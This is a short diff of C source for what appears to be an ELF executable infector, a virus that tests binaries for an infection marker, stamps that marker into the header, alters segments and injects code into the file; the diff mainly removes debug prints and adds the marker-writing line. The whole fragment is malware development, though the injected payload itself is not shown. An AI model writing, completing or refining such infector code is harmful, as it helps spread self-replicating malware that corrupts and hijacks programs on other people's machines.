@@ -9,7 +9,6 @@ static inline Elf64_Ehdr *get_header(struct elf *file)
 	Elf64_Ehdr *header;
 	
 	header = (Elf64_Ehdr *)file->ptr;
-	file->header = header;
 
 	if (file->ptr + sizeof(Elf64_Ehdr) >= file->ptr + file->size)
 		return NULL;
@@ -34,8 +33,6 @@ static inline bool is_linked(const Elf64_Ehdr *header)
 
 static inline bool is_not_infected(const Elf64_Ehdr *header)
 {
-	printf("HERE\n");
-	printf("%d\n", *(uint32_t *)((char *)&header->e_ident[EI_PAD]) != INFECTED_MAGIC_NUMBER);
 	return *(uint32_t *)((char *)&header->e_ident[EI_PAD]) != INFECTED_MAGIC_NUMBER;
 }
 
@@ -62,18 +59,17 @@ void infect_file(const char *filename)
 	if ((header = get_header(&file)) == NULL)
 		return ;
 
-	for (unsigned char index = 0; index < limit; index++)
+	for (register unsigned char index = 0; index < limit; index++)
 	{
-		printf("%s\n", filename);
 		if (sm[index].f(header) == false)
 			return ;
 	}
 
-	printf("Infect \"%s\"\n\n", filename);  // DEBUG
+	printf("\"%s\" is infectable\n\n", filename);  // DEBUG
+	*(unsigned int*)&header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;
 
 	modify_segments(&file);
-
-	inject(&file);
+	inject(&file, filename);
 
 	_munmap(file.ptr, file.size);
 }
